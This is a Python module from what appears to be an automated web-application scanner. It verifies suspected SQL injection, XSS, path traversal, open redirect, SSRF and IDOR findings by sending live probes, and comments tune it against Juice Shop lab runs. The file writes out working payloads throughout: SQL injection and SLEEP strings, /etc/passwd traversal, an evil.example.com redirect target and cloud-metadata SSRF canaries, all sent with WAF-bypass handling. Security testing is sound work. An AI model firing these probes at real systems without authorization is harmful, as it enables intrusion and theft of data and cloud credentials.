"""
core/wraith/vuln_verifier.py

The Vulnerability Verifier Engine (T2b).

Extracts the core vulnerability confirmation logic from the InternalTool interface
so it can be used programmatically by other components, such as the E2E tests
or orchestration engines.
"""

import asyncio
import re
import logging
from typing import Dict, Any, List, Optional, Tuple, Set
from urllib.parse import parse_qsl, urlencode, urlparse, urlunparse

from core.base.session import ScanSession
from core.web.contracts.enums import VulnerabilityClass
from core.wraith.mutation_engine import (
    ActionOutcome,
    HttpMethod,
    MutationEngine,
    MutationPayload,
    PayloadEncoding,
)
from core.wraith.waf_retry import get_or_create_waf_engine, waf_aware_send
from core.wraith.execution_policy import build_policy_runtime

logger = logging.getLogger(__name__)

# Re-use constants from the tool definition for now, since they define the logic
_SQLI_ERROR_PATTERNS = [
    r"you have an error in your sql syntax", r"warning: mysql", r"unclosed quotation mark",
    r"quoted string not properly terminated", r"pg::syntax", r"ora-\d{4,5}:",
    r"microsoft ole db provider for odbc drivers", r"syntax error.*at or near",
    r"unterminated string literal", r"sqlstate\[",
    # SQLite (e.g. OWASP Juice Shop) and broader generic signatures — the
    # original set missed SQLite entirely (Run #26 lab verification).
    r"sqlite_?error", r"sqlite3?::", r'near ".*": syntax error',
    r"sql syntax.*error|syntax error.*sql", r"odbc.*driver.*sql",
]
_SQLI_ERROR_RE = re.compile("|".join(_SQLI_ERROR_PATTERNS), re.IGNORECASE)
_SQLI_TIME_THRESHOLD_S = 3.0  # 3s is enough margin over typical response times
_PATH_TRAV_MARKERS = ["root:x:0:0", "[boot loader]", "daemon:x:", "nobody:x:"]
_CONFIRM_THRESHOLD = 0.80
_DISMISS_THRESHOLD = 0.25

class VulnVerifier:
    """
    Engine for proactively verifying T1 findings (SQLi, XSS, Path Traversal, Open Redirect, IDOR).
    Generates payloads and evaluates responses to confirm or reject findings.
    """

    def __init__(self, session: ScanSession):
        self.session = session
        self.waf_engine = get_or_create_waf_engine(self.session.knowledge)

    async def verify_finding(
        self, 
        engine: MutationEngine, 
        finding: Dict[str, Any], 
        url: str,
        vuln_class: VulnerabilityClass,
        headers: Dict[str, str], 
        cookies: Dict[str, str], 
        budget: int = 5
    ) -> Tuple[List[Tuple[float, str, str, str]], int]:
        """Verify a single finding."""
        if vuln_class == VulnerabilityClass.SQLI:
            return await self._confirm_sqli(engine, url, headers, cookies, budget)
        if vuln_class == VulnerabilityClass.XSS:
            return await self._confirm_xss(engine, url, headers, cookies, budget)
        if vuln_class == VulnerabilityClass.PATH_TRAVERSAL:
            return await self._confirm_path_traversal(engine, url, headers, cookies, budget)
        if vuln_class == VulnerabilityClass.OPEN_REDIRECT:
            return await self._confirm_open_redirect(engine, url, headers, cookies, budget)
        if vuln_class == VulnerabilityClass.IDOR:
            return await self._confirm_idor(engine, url, headers, cookies, budget)
        if vuln_class == VulnerabilityClass.SSRF:
            return await self._confirm_ssrf(engine, url, headers, cookies, budget)

        return await self._confirm_generic(engine, url, headers, cookies, budget)

    def _inject_query_param(self, url: str, param: str, payload: str) -> str:
        parsed = urlparse(url)
        params = dict(parse_qsl(parsed.query or "", keep_blank_values=True))
        params[param] = payload
        return urlunparse(parsed._replace(query=urlencode(params), fragment=""))

    def _inject_path_segment(self, url: str, payload: str) -> Optional[Tuple[str, str]]:
        parsed = urlparse(url)
        parts = [p for p in (parsed.path or "/").split("/") if p]
        for i in range(len(parts) - 1, -1, -1):
            seg = parts[i]
            if seg.isdigit() or (len(seg) in (32, 36) and all(c in "0123456789abcdefABCDEF-" for c in seg)):
                original = parts[i]
                parts[i] = payload
                return urlunparse(parsed._replace(path="/" + "/".join(parts), fragment="")), original
        return None

    def _get_resp_body(self, outcome) -> str:
        # waf_aware_send returns (MutationResponse, ActionOutcome, bypassed).
        # Callers bind position 0 (the MutationResponse) into a variable named
        # `outcome` — so .body lives DIRECTLY here, NOT under an inner
        # `.response`. The previous code looked for outcome.response.body and
        # silently returned "" → SQL-error regex never matched (Run #26 lab).
        if outcome is None:
            return ""
        body = getattr(outcome, "body", None)
        if body is None:
            body = getattr(outcome, "text", None) or ""
        return str(body)

    def _get_resp_status(self, outcome) -> int:
        # Same indirection bug as _get_resp_body had — every _confirm_* method
        # was reading `outcome.response.status_code` and getting 0 because
        # MutationResponse has status_code directly on it. That silently
        # disabled IDOR, OpenRedirect, SSRF (status-code branch), and Generic
        # confirmation paths. Live calibration against Juice Shop (Run #26):
        # /rest/basket/2 returned HTTP 200 but `_confirm_idor` saw 0 and gave
        # up — exact symptom that prompted this fix pass.
        if outcome is None:
            return 0
        return int(getattr(outcome, "status_code", 0) or 0)

    def _get_resp_headers(self, outcome) -> Dict[str, str]:
        # As above: headers live directly on MutationResponse. Open-redirect
        # confirmation needs the Location header; reading off the phantom
        # `.response` attribute returned {} and the check never fired.
        if outcome is None:
            return {}
        h = getattr(outcome, "headers", None)
        if not isinstance(h, dict):
            return {}
        # Case-insensitive copy — httpx already lowercases, but some upstreams
        # don't, and `.get("location")` should win whether the server sent
        # `Location` or `location`.
        return {str(k).lower(): str(v) for k, v in h.items()}

    async def _confirm_sqli(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        if not params: return results, probes

        # Error-based: the boundary must break the EXISTING query context, so we
        # APPEND it to the parameter's real value instead of replacing the value
        # with a bare boundary. Live-proven on Juice Shop (Run #27): `q='` returns
        # 200/empty (the bare quote never breaks the surrounding `LIKE '%...%'`),
        # but `q=<value>'` trips `SQLITE_ERROR: ... syntax error`. Replacing the
        # value was why the verifier missed a textbook SQLi sitting on its own
        # seed endpoint (/rest/products/search).
        cookie_hdr = "; ".join(f"{k}={v}" for k, v in cookies.items())
        send_headers = {**headers, **({"Cookie": cookie_hdr} if cookie_hdr else {})}
        param_values = dict(parse_qsl(urlparse(url).query or "", keep_blank_values=True))
        for param in params[:2]:
            # Non-empty base so the appended boundary actually breaks the context.
            base = param_values.get(param) or "a"
            for boundary in ("'", "'))", "\")", "')) OR (('1'='1", "' OR '1'='1'-- -"):
                if probes >= budget:
                    break
                probe = f"{base}{boundary}"
                probe_url = self._inject_query_param(url, param, probe)
                payload = MutationPayload(value=probe, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.SQLI, description=f"SQLi error probe {probe!r}")
                outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers=send_headers)
                probes += 1
                body = self._get_resp_body(outcome)
                if _SQLI_ERROR_RE.search(body):
                    return [(0.92, f"SQLi error response to {probe!r}: {body[:120]}", f"{probe} in {param}", "SQLi")], probes
            if probes >= budget:
                break

        # Time-based
        if probes < budget and params:
            param = params[0]
            sleep_payload = "' OR SLEEP(5)-- -"
            probe_url = self._inject_query_param(url, param, sleep_payload)
            payload = MutationPayload(value=sleep_payload, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.SQLI, description="SQLi time-based probe")
            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
            probes += 1
            # MutationResponse exposes .elapsed_ms (ms, not seconds) directly.
            elapsed = float(getattr(outcome, "elapsed_ms", 0) or 0) / 1000.0
            if elapsed >= _SQLI_TIME_THRESHOLD_S:
                results.append((0.88, f"Time-based SQLi: took {elapsed:.1f}s", f"SLEEP(5) in {param}", "SQLi"))

        return results, probes

    async def _confirm_xss(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        if not params: return results, probes

        sentinel = "<scr1pt>alert(1)</scr1pt>"
        for param in params[:min(budget, 2)]:
            probe_url = self._inject_query_param(url, param, sentinel)
            payload = MutationPayload(value=sentinel, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.XSS, description="XSS reflection probe")
            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
            probes += 1
            if sentinel.lower() in self._get_resp_body(outcome).lower():
                return [(0.90, "XSS payload reflected unencoded", f"{sentinel} in {param}", "XSS")], probes
        return results, probes

    async def _confirm_path_traversal(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        
        for trav in ["../../etc/passwd", "../../../etc/passwd", "..%2F..%2Fetc%2Fpasswd"][:min(budget, 2)]:
            probe_url = self._inject_query_param(url, params[0], trav) if params else (self._inject_path_segment(url, trav)[0] if self._inject_path_segment(url, trav) else None)
            if not probe_url: break

            payload = MutationPayload(value=trav, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.PATH_TRAVERSAL, description="Path traversal")
            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
            probes += 1
            body = self._get_resp_body(outcome)
            for marker in _PATH_TRAV_MARKERS:
                if marker in body:
                    return [(0.95, f"Path traversal confirmed: '{marker}'", trav, "Path Traversal")], probes
        return results, probes

    async def _confirm_open_redirect(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        if not params: return results, probes

        redirect_target = "https://evil.example.com/pwned"
        for param in params[:min(budget, 2)]:
            probe_url = self._inject_query_param(url, param, redirect_target)
            payload = MutationPayload(value=redirect_target, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.OPEN_REDIRECT, description="Open redirect probe")
            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
            probes += 1
            loc = self._get_resp_headers(outcome).get("location", "")
            if "evil.example.com" in loc:
                return [(0.91, f"Open redirect confirmed: Location header → {loc}", f"{redirect_target} in {param}", "Open Redirect")], probes
        return results, probes

    async def _confirm_ssrf(
        self,
        engine: MutationEngine,
        url: str,
        headers: Dict[str, str],
        cookies: Dict[str, str],
        budget: int,
    ) -> Tuple[List[Tuple[float, str, str, str]], int]:
        """Confirm SSRF by injecting a canary URL into parameters that accept URLs.
        
        Strategy:
        - Inject http://169.254.169.254/latest/meta-data/ (cloud metadata endpoint)
          into any parameter whose name suggests a URL (url, href, redirect, src,
          endpoint, host, next, target, fetch, load, image, icon, proxy, callback).
        - A 200 response with AWS-style metadata content confirms cloud SSRF.
        - A connection-refused or timeout error (vs. normal 200/404) suggests the
          server attempted the connection — low-confidence SSRF indicator.
        """
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        
        # Focus on parameters that are likely to accept URLs
        _URL_PARAM_HINTS = {
            "url", "href", "redirect", "redirecturl", "next", "target",
            "src", "source", "dest", "destination", "endpoint", "host",
            "fetch", "load", "image", "icon", "proxy", "callback", "return",
            "returnurl", "goto", "link", "uri", "path", "resource",
        }
        url_params = [p for p in params if p.lower().strip("_-[]") in _URL_PARAM_HINTS] or params[:1]
        
        if not url_params:
            return results, probes

        canary_targets = [
            "http://169.254.169.254/latest/meta-data/",  # AWS metadata
            "http://metadata.google.internal/computeMetadata/v1/",  # GCP metadata
        ]
        
        _SSRF_RESPONSE_MARKERS = [
            "ami-id", "instance-id", "local-ipv4",       # AWS EC2 metadata keys
            "computeMetadata",                            # GCP metadata
            "hostname", "placement",                      # Generic cloud metadata
        ]

        for param in url_params[:min(budget, 2)]:
            for canary in canary_targets[:1]:  # 1 canary per param to respect budget
                if probes >= budget:
                    break
                probe_url = self._inject_query_param(url, param, canary)
                payload = MutationPayload(
                    value=canary,
                    encoding=PayloadEncoding.NONE,
                    vuln_class=VulnerabilityClass.SSRF,
                    description="SSRF cloud metadata probe",
                )
                outcome, _, _ = await waf_aware_send(
                    engine,
                    probe_url,
                    payload,
                    method=HttpMethod.GET,
                    headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())},
                )
                probes += 1
                body = self._get_resp_body(outcome)
                status = self._get_resp_status(outcome)

                # High confidence: server fetched and returned cloud metadata
                for marker in _SSRF_RESPONSE_MARKERS:
                    if marker in body:
                        return [
                            (
                                0.93,
                                f"SSRF confirmed: server returned cloud metadata marker '{marker}'",
                                f"canary={canary} in {param}",
                                "SSRF",
                            )
                        ], probes

                # Low confidence: server made a connection attempt (got unexpected response)
                if status not in (0, 200, 301, 302, 400, 403, 404, 422) and 100 <= status < 600:
                    results.append(
                        (
                            0.45,
                            f"SSRF possible: unexpected HTTP {status} for cloud metadata canary",
                            f"canary={canary} in {param}",
                            "SSRF",
                        )
                    )

        return results, probes

    async def _confirm_idor(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        """Confirm IDOR by fetching baseline vs. neighbor-ID, requiring evidence
        that the neighbor response contains DIFFERENT data than the baseline.

        Why a baseline matters: the old heuristic ("200 + body > 50") fired on
        anything that wasn't a 4xx — homepages, generic landing pages,
        catch-all SPA shells all qualified. Juice Shop's `/rest/basket/2`
        does return 200 with another user's basket data — but the heuristic
        also false-positives on `/api/users/<id>` endpoints whose UI shell
        is the same 200-OK SPA for every ID. Comparing against baseline at
        the original ID resolves that: identical body → not IDOR (just a
        shell), different-but-structurally-similar body → real IDOR.

        Confidence tiers:
          0.85 — both 200, similar size (±50%), different body hashes,
                 JSON-shaped (object/array). High-confidence IDOR shape.
          0.60 — both 200, different body hashes, non-JSON or wildly
                 different sizes (still suspicious but could be cache/SPA).
        """
        results, probes = [], 0
        r = self._inject_path_segment(url, "999999")
        if not r: return results, probes

        _, original_id = r
        try: target_id = int(original_id)
        except ValueError: return results, probes

        # Build cookie header once — used for both baseline and neighbor probes.
        cookie_header = "; ".join(f"{k}={v}" for k, v in cookies.items())
        req_headers = {**headers, "Cookie": cookie_header} if cookie_header else dict(headers)

        # Baseline probe at the ORIGINAL id (this is the resource the caller
        # legitimately owns / referenced). We probe budget-1 neighbors,
        # reserving 1 budget slot for baseline so we always compare.
        baseline_payload = MutationPayload(
            value=str(target_id), encoding=PayloadEncoding.NONE,
            vuln_class=VulnerabilityClass.IDOR, description="IDOR baseline",
        )
        baseline_outcome, _, _ = await waf_aware_send(
            engine, url, baseline_payload, method=HttpMethod.GET, headers=req_headers,
        )
        probes += 1
        baseline_status = self._get_resp_status(baseline_outcome)
        baseline_body = self._get_resp_body(baseline_outcome)
        baseline_hash = getattr(baseline_outcome, "body_hash", "") or ""

        # If baseline itself didn't return 200, we can't reason about IDOR
        # (we don't even have a known-good response shape to compare against).
        if baseline_status != 200:
            return results, probes

        remaining = max(1, budget - 1)
        for delta in [1, -1, 2, -2][:remaining]:
            probe_id = target_id + delta
            if probe_id <= 0: continue
            probe_url, _ = self._inject_path_segment(url, str(probe_id))
            payload = MutationPayload(
                value=str(probe_id), encoding=PayloadEncoding.NONE,
                vuln_class=VulnerabilityClass.IDOR, description="IDOR neighbor probe",
            )
            outcome, _, _ = await waf_aware_send(
                engine, probe_url, payload, method=HttpMethod.GET, headers=req_headers,
            )
            probes += 1
            status = self._get_resp_status(outcome)
            body = self._get_resp_body(outcome)
            body_hash = getattr(outcome, "body_hash", "") or ""

            # Only 200 OK is interesting. 401/403/404 means access control
            # IS working — that's the opposite of IDOR.
            if status != 200 or len(body) < 50:
                continue

            # If the body is byte-identical to baseline, we're looking at a
            # generic shell (SPA, homepage), NOT a per-resource response.
            if body_hash and body_hash == baseline_hash:
                continue
            if body == baseline_body:
                continue

            # Heuristic check: do both responses look like JSON? Same shape
            # but different IDs is the canonical IDOR signature. Size proximity
            # confirms "same template, different payload" rather than "200
            # with a totally unrelated body".
            both_json = (
                baseline_body.lstrip().startswith(("{", "["))
                and body.lstrip().startswith(("{", "["))
            )
            size_ratio = min(len(body), len(baseline_body)) / max(len(body), len(baseline_body), 1)
            structurally_similar = size_ratio >= 0.5

            if both_json and structurally_similar:
                results.append((
                    0.85,
                    f"IDOR confirmed: id {target_id}→{probe_id} returned distinct JSON of similar shape ({len(baseline_body)}B vs {len(body)}B)",
                    f"id: {target_id}→{probe_id}",
                    "IDOR",
                ))
                break
            # Same-status, different body, but not JSON-shaped or wildly
            # different sizes — still suspicious but flag with lower confidence.
            results.append((
                0.60,
                f"IDOR possible: id {target_id}→{probe_id} returned 200 with distinct body ({len(baseline_body)}B vs {len(body)}B, json={both_json})",
                f"id: {target_id}→{probe_id}",
                "IDOR",
            ))
            break
        return results, probes

    async def _confirm_generic(self, engine: MutationEngine, url: str, headers: Dict[str, str], cookies: Dict[str, str], budget: int) -> Tuple[List[Tuple[float, str, str, str]], int]:
        results, probes = [], 0
        params = [k for k, _ in parse_qsl(urlparse(url).query or "", keep_blank_values=True)]
        if not params: return results, probes

        for probe_val in ["%00", "' OR '1'='1"][:budget]:
            probe_url = self._inject_query_param(url, params[0], probe_val)
            payload = MutationPayload(value=probe_val, encoding=PayloadEncoding.NONE, vuln_class=VulnerabilityClass.GENERIC, description="Generic error probe")
            outcome, _, _ = await waf_aware_send(engine, probe_url, payload, method=HttpMethod.GET, headers={**headers, "Cookie": "; ".join(f"{k}={v}" for k, v in cookies.items())})
            probes += 1
            if self._get_resp_status(outcome) in (500, 503):
                results.append((0.55, "Generic error triggered. Possible injection.", f"{probe_val} in {params[0]}", "Generic Error"))
                break
        return results, probes
